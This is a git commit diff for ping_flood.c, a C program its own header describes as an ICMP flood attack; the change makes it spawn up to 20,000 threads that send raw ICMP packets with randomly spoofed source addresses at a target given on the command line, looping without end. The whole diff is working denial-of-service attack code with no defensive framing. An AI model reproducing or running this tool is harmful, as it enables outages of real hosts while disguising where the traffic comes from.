897f97bd6e16962bbd0bfed2bc8500637ab9ed2e
sgy <shengybest@gmail.com>
2013-10-29 18:01:06 +0800

    rewrite ping_flood.c:  use multiple pthread

--- ping_flood.c
+++ ping_flood.c
@@ -1,6 +1,8 @@
-/*date: 2013-10-26
+/*
+ *function: flood attack in icmp
  *author: shenya
-	*/
+ *date: 2013-10-29
+ */
 #include <stdio.h>
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
@@ -13,6 +15,11 @@
 #include <sys/time.h>
 #include <signal.h>
 #include <pthread.h>
+
+
+#define MAX_PTHREAD 20000
+
+pthread_t flood_tid[MAX_PTHREAD];
 
 uint8_t *hostname = NULL;
 static unsigned long dest = 0;
@@ -48,8 +55,11 @@ int32_t icmp_cksum(void *data, int length)
 static long int ip_random(void)
 {
 	long int random_ip;
+	struct timeval time_now;
 	
-	srand(time(0));
+	gettimeofday(&time_now, NULL);
+	srand(time_now.tv_usec);
+	//srand(time(0));
 
 	random_ip = random();
 
@@ -83,6 +93,7 @@ static void Dos_icmp(void)
 	iph->ip_ttl = 0x0;
 	iph->ip_p = IPPROTO_ICMP;
 	iph->ip_sum = 0;
+	//addr_temp.s_addr = inet_addr("127.0.0.1");
 	addr_temp.s_addr = ip_random();
 	iph->ip_src = addr_temp;
 	addr_temp.s_addr = dest;
@@ -118,7 +129,8 @@ int main(int argc, char *argv[])
 	struct hostent *host = NULL;
 	struct protoent *protocol = NULL;		
 	char protoname[] = "icmp";
-	pthread_t tid;
+	struct sockaddr_in dest_addr;
+	int i;
 
 	if(argc < 2)
 	{
@@ -133,11 +145,12 @@ int main(int argc, char *argv[])
 	}
 
 	memset(&dest, 0, sizeof(dest));
+	memset(&dest_addr, 0, sizeof(dest_addr));
+
 	hostname = argv[1];
 
 	dest = inet_addr(hostname);
-#if 0
-	else
+	if(dest == INADDR_NONE)
 	{
 
 		host = gethostbyname(hostname);
@@ -147,11 +160,10 @@ int main(int argc, char *argv[])
 			exit(1);
 		}
 		
-	//	printf("addr is %s\n", inet_ntoa(*((struct in_addr *)host->h_addr)));
-		memcpy((char *)&dest.sin_addr, host->h_addr, host->h_length);
-		memcpy(dest_str, inet_ntoa(*((struct in_addr *)host->h_addr)), strlen(inet_ntoa(*((struct in_addr *)host->h_addr))));
-#endif
-	
+	//printf("addr is %s\n", inet_ntoa(*((struct in_addr *)host->h_addr)));
+		memcpy((char *)&dest_addr.sin_addr, host->h_addr, host->h_length);
+  	dest = dest_addr.sin_addr.s_addr;
+	}
 	rawsock = socket(AF_INET, SOCK_RAW, protocol->p_proto);
 	if(rawsock < 0)
 	{
@@ -161,10 +173,23 @@ int main(int argc, char *argv[])
 
 	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));
 	
-	pthread_create(&tid, NULL, Dos_fun, NULL);
-	Dos_icmp();
+
+	for(i=0; i<MAX_PTHREAD; i++)
+	{
+		pthread_create(&flood_tid[i], NULL, Dos_fun, NULL);
+	}
+
+#if 0
+	for(i=0; i<MAX_PTHREAD; i++)
+	{
+		pthread_join(flood_tid[i], NULL);
+	}
+
+#endif
 
 	
 	while(1);
 	return 0;
+
 }
+
